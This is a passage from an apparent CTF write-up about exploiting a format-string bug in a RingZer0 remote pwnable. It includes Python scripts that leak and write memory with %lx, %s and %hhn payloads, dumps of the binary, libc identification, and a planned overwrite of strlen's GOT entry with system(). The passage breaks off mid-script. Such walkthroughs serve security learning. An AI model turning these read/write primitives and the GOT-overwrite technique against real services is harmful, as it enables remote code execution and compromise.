<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_directly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$lx</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">addr</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_indirectly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$s</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># ugly workaround, only grab 8 bytes. will fix this later!</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">,</span> <span class="n">address</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write_byte_value_via</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$hhn</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">read_from_address</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span><span class='line'>      <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
</span><span class='line'>      <span class="n">addr</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">b</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">i</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>      <span class="c"># change address</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>    <span class="c"># write byte</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">dump1</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dump1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">parameter_636_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;parameter 5 points to: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">parameter_636_addr</span><span class="p">)</span>
</span><span class='line'><span class="n">value_at_636</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;address pointed to by parameter 5 contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_636</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">value_at_scratch</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_scratch</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">format_offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">value_at_636</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span><span class="p">)</span> <span class="o">-</span> <span class="n">parameter_636_addr</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch is parameter {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;read from 0x400000: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">read_from_address</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5<span class="nv">$ </span>python sploit3.py
</span><span class='line'>parameter <span class="m">5</span> points to:  0x7fff3ca480d8
</span><span class='line'>address pointed to by parameter <span class="m">5</span> contains:  0x7fff3ca49f01
</span><span class='line'>scratch contains:  0x7369
</span><span class='line'>scratch is parameter 1601
</span><span class='line'><span class="nb">read </span>from 0x400000: 0x10102464c457f
</span></code></pre></td></tr></table></div></figure>


<p>Indeed, this dumps out the ELF header&rsquo;s magic bytes! By this time, I noticed that trying to read from an address that contains a NULL byte as the first byte, returns 0x7369. I used this in the dumper to identify NULL bytes.</p>

<p>From here on out, I adjusted the script to dump out the entire binary. It was a slow process, but I managed to speed it up a bit by not having it write out the full address each time, and dumping as much bytes as possible (I adjusted the <code>grab_value_indirectly</code>). The problem with the dumping process via <code>sprintf</code> is that it stops dumping bytes when it hits a <code>0x0a</code>, <code>0x0d</code> or <code>0x00</code> byte. I have no way of knowing which one it actually is, so I assumed NULL bytes. This gave me an imperfect dump, which I could not run and <code>readelf</code> could not make heads or tails of the section headers.</p>

<p>This meant that I had no way of knowing exactly where each GOT entry was, and which function address each entry held. Reverse engineering the dumped binary provided an alternative. I was looking at the output of <code>xxd</code> and noticed the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...snip...
</span><span class='line'>00014a0: ffc7 <span class="m">8580</span> edff ff41 <span class="m">4141</span> 41c7 <span class="m">8584</span> edff  .......AAAA.....
</span><span class='line'>00014b0: <span class="m">0042</span> <span class="m">4242</span> 42c7 <span class="m">8588</span> edff ff43 <span class="m">4343</span> 43c6  .BBBB......CCCC
</span><span class='line'>...snip...
</span></code></pre></td></tr></table></div></figure>


<p>This looks familiar, doesn&rsquo;t it?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="n">test</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;AAAABBBBCCCC&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I out those bytes, starting at 0x1260, and ran the resulting string through <code>rasm2</code>. This gave me the raw bytes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>xxd -c <span class="m">1</span> dump <span class="p">|</span>grep <span class="m">1260</span> -A512 <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span> <span class="p">|</span>tr -d <span class="s1">&#39;\n&#39;</span>
</span><span class='line'>b800000000e8b6f8ffffc78540edffff48460052c78544edffff656d6f74c78548edffff
</span><span class='line'>65005365c7854cedffff63757265c78550edffff00536865c78554edffff6c6c005bc785
</span><span class='line'>...snip...
</span></code></pre></td></tr></table></div></figure>


<p>I ran this output through <code>rasm2</code> to show the corresponding assembly code. I put in the correct starting address for rasm2. This is the address of the start of the binary (0x400000) plus the offset from which I&rsquo;ve dumped, 0x1260. A bit of reverse-engineering led me to identify <code>malloc</code>, <code>memset</code> and <code>strlen</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;b800...&#39;</span> <span class="p">|</span> rasm2 -d -b <span class="m">64</span> -o 0x401260 -
</span><span class='line'>
</span><span class='line'>mov dword <span class="o">[</span>rbp-0x50<span class="o">]</span>, 0x0
</span><span class='line'>mov eax, <span class="o">[</span>rbp-0x20<span class="o">]</span>
</span><span class='line'>cmp eax, <span class="o">[</span>rbp-0x1c<span class="o">]</span>
</span><span class='line'>jnz dword 0x4015d1
</span><span class='line'>// char *response <span class="o">=</span> NULL<span class="p">;</span>
</span><span class='line'>mov qword <span class="o">[</span>rbp-0x58<span class="o">]</span>, 0x0       
</span><span class='line'>// char *cleanBuffer <span class="o">=</span> NULL<span class="p">;</span>
</span><span class='line'>mov qword <span class="o">[</span>rbp-0x60<span class="o">]</span>, 0x0   
</span><span class='line'>// <span class="nv">response</span> <span class="o">=</span> <span class="o">(</span>char*<span class="o">)</span>malloc<span class="o">(</span>2048<span class="o">)</span><span class="p">;</span>  
</span><span class='line'>mov edi, 0x800                    
</span><span class='line'>call dword 0x400ba0               
</span><span class='line'>mov <span class="o">[</span>rbp-0x58<span class="o">]</span>, rax
</span><span class='line'>// memset<span class="o">(</span>response, 0, 2048<span class="o">)</span><span class="p">;</span>
</span><span class='line'>mov rax, <span class="o">[</span>rbp-0x58<span class="o">]</span>
</span><span class='line'>mov edx, 0x800
</span><span class='line'>mov esi, 0x0
</span><span class='line'>mov rdi, rax
</span><span class='line'>call dword 0x400b40
</span><span class='line'>// <span class="nv">cleanBuffer</span> <span class="o">=</span> <span class="o">(</span>char*<span class="o">)</span>malloc<span class="o">(</span>strlen<span class="o">(</span>buf<span class="o">))</span><span class="p">;</span>
</span><span class='line'>lea rax, <span class="o">[</span>rbp-0x11f0<span class="o">]</span>
</span><span class='line'>mov rdi, rax
</span><span class='line'>call dword 0x400b00   
</span><span class='line'>mov rdi, rax
</span><span class='line'>call dword 0x400ba0
</span><span class='line'>mov <span class="o">[</span>rbp-0x60<span class="o">]</span>, rax
</span><span class='line'>lea rax, <span class="o">[</span>rbp-0x11f0<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, these calls go to the PLT, which uses an address located in the GOT to do the actual library call. From the disassembly and the raw bytes, I was able to find out to which memory address the calls go. For example, let&rsquo;s find the address of the GOT entry for <code>strlen</code>. From the disassembly provided above, I know it&rsquo;s PLT stub is at <code>0x400b00</code>, so dumping from <code>0xb00</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0000b00: ff25 fa0f <span class="m">0000</span> <span class="m">6807</span> <span class="m">0000</span> 00e9 70ff ffff  .%....h.....p...
</span></code></pre></td></tr></table></div></figure>


<p>This disassembles to</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>rasm2 -d -b <span class="m">64</span> -o 0x400b00 -
</span><span class='line'>ff25fa0f0000
</span><span class='line'>jmp qword <span class="o">[</span>rip+0xffa<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>So it actually references the QWORD at <code>0x400b00</code> + <code>6</code> + <code>0x0ffa</code>, which is <code>0x401b00</code>. This made no sense to me, and it still doesn&rsquo;t. I know for a fact that the GOT is actually at <code>0x60xxxx</code>, so I took a chance and dumped the bytes from that location. This indeed contained a libc address! Assuming my reversing skills are okay, I have a way to read two libc addresses to two known functions! This would allow me to identify which libc version is in use and get me one step closer to my goal of shelling this challenge out.</p>

<h2>libc Version: Computer Says No</h2>

<p>To identify the libc version in use, I&rsquo;d need two libc addresses and the corresponding function names. I could compare the difference of these addresses to those found on the libc binaries I had. I used my <a href="https://gist.github.com/barrebas/e99194a4ac8b5252773c">own little script</a> for this. Alas, I found no exact match, even though I had downloaded all the libc versions that Debian provided. It did seem, however, that the libc in use on the remote box was very similar to <a href="https://packages.debian.org/wheezy/amd64/libc-bin/download">libc 2.13-38</a>. This gave me a handle and soon I was dumping from libc. I did this by first grabbing <code>strlen</code> from the GOT, and then subtracting the offset of <code>strlen</code>. This yielded a wrong libc base, but it was good enough to use a reference in combination with libc-2.13-38.</p>

<p>I decided to look for <code>system()</code> the old fashioned way: by dumping all the bytes from the <code>libc_base + system_offset_in_libc-2.13</code> - 0x1000 to +0x1000. In these bytes, I found <code>system()</code> at -0x90:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0000f70: <span class="m">5348</span> 83ec <span class="m">1048</span> 85ff <span class="m">7416</span> 8b05 4ca9 <span class="m">3400</span>  SH...H..t...L.4.
</span><span class='line'>0000f80: 85c0 <span class="m">7526</span> <span class="m">4883</span> c410 5be9 82fb ffff <span class="m">6690</span>  ..u<span class="p">&amp;</span>H...<span class="o">[</span>.....f.
</span></code></pre></td></tr></table></div></figure>


<p>You see, <code>system()</code> in libc 2.13 looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>objdump -d -M intel libc-2.13.so <span class="p">|</span>grep system -A10
</span><span class='line'>
</span><span class='line'>000000000003fc70 &lt;__libc_system&gt;:
</span><span class='line'>   3fc70: <span class="m">53</span>                      push   rbx
</span><span class='line'>   3fc71: <span class="m">48</span> <span class="m">83</span> ec <span class="m">10</span>             sub    rsp,0x10
</span><span class='line'>   3fc75: <span class="m">48</span> <span class="m">85</span> ff                <span class="nb">test   </span>rdi,rdi
</span><span class='line'>   3fc78: <span class="m">74</span> <span class="m">16</span>                   je     3fc90 &lt;__libc_system+0x20&gt;
</span><span class='line'>   3fc7a: 8b <span class="m">05</span> 6c b9 <span class="m">34</span> <span class="m">00</span>       mov    eax,DWORD PTR <span class="o">[</span>rip+0x34b96c<span class="o">]</span>        <span class="c"># 38b5ec &lt;argp_program_version_hook+0x1b4&gt;</span>
</span><span class='line'>   3fc80: <span class="m">85</span> c0                   <span class="nb">test   </span>eax,eax
</span><span class='line'>   3fc82: <span class="m">75</span> <span class="m">26</span>                   jne    3fcaa &lt;__libc_system+0x3a&gt;
</span><span class='line'>   3fc84: <span class="m">48</span> <span class="m">83</span> c4 <span class="m">10</span>             add    rsp,0x10
</span><span class='line'>   3fc88: 5b                      pop    rbx
</span><span class='line'>   3fc89: e9 <span class="m">82</span> fb ff ff          jmp    3f810 &lt;__strtold_l+0x10&gt;
</span><span class='line'>   3fc8e: <span class="m">66</span> <span class="m">90</span>                   xchg   ax,ax
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s a perfect match! I had the address of system. I turned my attention to overwriting a GOT entry. I settled on overwriting <code>strlen</code>&rsquo;s GOT entry. After the overwriting was done, the next connection would use my <code>buf</code> as input for <code>system()</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">cleanBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'><span class="c1">// disassembly:</span>
</span><span class='line'><span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x11f0</span><span class="p">]</span>
</span><span class='line'><span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
</span><span class='line'><span class="n">call</span> <span class="n">dword</span> <span class="mh">0x400b00</span> <span class="o">&lt;</span> <span class="n">the</span> <span class="n">GOT</span> <span class="n">entry</span> <span class="k">for</span> <span class="n">strlen</span> <span class="n">will</span> <span class="n">be</span> <span class="n">pointing</span> <span class="n">to</span> <span class="n">system</span><span class="o">!</span>
</span></code></pre></td></tr></table></div></figure>


<p>The addresses for <code>strlen</code> and <code>system</code> only differed in the last three bytes. Therefore, I had to figure out a way to write three bytes at the same time; if I overwrote one byte each time, then by the time I connected to overwrite the second byte, I&rsquo;d get a crash. This is because the GOT entry for strlen would be pointing to a rather random memory location!</p>

<p>So, writing three bytes at once requires three memory address to be present on the stack, which can be addressed directly. From there, I again used the <code>%&lt;number&gt;%&lt;offset&gt;$hhn</code> primitive to write a byte.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">write_on_stack</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
</span><span class='line'>  <span class="c"># write out all the bytes of what</span>
</span><span class='line'>  <span class="c"># used to write addresses on the stack</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span><span class='line'>      <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">what</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
</span><span class='line'>      <span class="n">what</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">b</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="n">where</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">i</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="n">where</span><span class="p">)</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] wrote {} to {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="o">+</span><span class="n">where</span><span class="o">/</span><span class="mi">8</span><span class="p">)),</span> <span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="o">+</span><span class="n">where</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">parameter_636_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;parameter 5 points to: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">parameter_636_addr</span><span class="p">)</span>
</span><span class='line'><span class="n">value_at_636</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;address pointed to by parameter 5 contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_636</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">value_at_scratch</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_scratch</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">format_offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">value_at_636</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span><span class="p">)</span> <span class="o">-</span> <span class="n">parameter_636_addr</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch is parameter {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># grab strlen from the GOT entry</span>
